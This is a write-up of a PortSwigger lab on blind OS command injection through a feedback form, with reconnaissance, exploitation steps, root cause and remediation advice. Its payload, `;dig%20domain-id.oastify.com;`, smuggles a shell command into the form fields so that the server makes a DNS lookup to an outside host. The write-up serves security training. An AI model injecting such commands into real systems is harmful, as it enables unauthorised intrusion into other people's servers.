## Metadata

- **Difficulty:** Practitioner
- **Category:** OS Command Injection
- **Lab URL:** [Lab: Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
- **Date Solved:** 22/8/2026
## Vulnerability Summary

The app contains a blind OS Command Injection vulnerability in the feedback function. The app executes shell command containing the user-supplied input without any sanitization or validation. Thus, we can  trigger an out-of-band interaction with our external domain, confirming OS command injection.
## Reconnaissance

- Click on the "Submit feedback" button and input random legitimate values. Intercept this request (`POST /feedback/submit`). The response should contain the following line (`csrf-token` is randomized):
```
csrf=csrf-token&name=1&email=1&subject=1&message=1
```
- Per the lab's description, we can trigger an out-of-band interaction with an external domain. We can do this with various commands: `nslookup`, `dig`...
## Exploitation Steps

1. Click on the "Submit feedback" button and input random values. Intercept this request.
2. On Burp's Collaborator tab, generate 1 payload. This is the external domain that we will issue a DNS lookup to. It should be in the form of `domain-id.oastify.com`
3. Append this payload into all 4 of the parameters (`name`, `email`, `subject`, `message`): `;dig%20domain-id.oastify.com;`. Submit the request.
4. After receiving the response, after a short amount of time, your collaborator domain should receive a DNS lookup from the app's server. Lab is solved.
(On further testing, the `email` parameter is the vulnerable one).
## Payload Used

`;dig%20domain-id.oastify.com;`
Since the app uses user-supplied input to execute shell commands without any validation or sanitization, our injected shell command is executed too. Our `dig` command forces the backend server to perform a DNS lookup for `domain-id.oastify.com`, confirming the OS command injection vulnerability. 
## Root Cause

The app blindly trusts user-supplied input to execute bash command without validation or sanitization.
## Remediation

The app should never invoke OS commands directly using user-supplied input. Instead, it should use built-in library functions or APIs (e.g., using a native DNS resolution library) to achieve the required functionality.
If calling out to an external OS command is strictly unavoidable:
- Implement strict input validation using a whitelist (e.g., validate that the input fields only contains alphanumeric characters).
- Never pass user input to a shell interpreter (like `system()` or `popen()`). Instead, use parameterized execution APIs (like `subprocess.run()` in Python with `shell=False`, or `execFile` in Node.js) that execute the binary directly and pass user input safely as arguments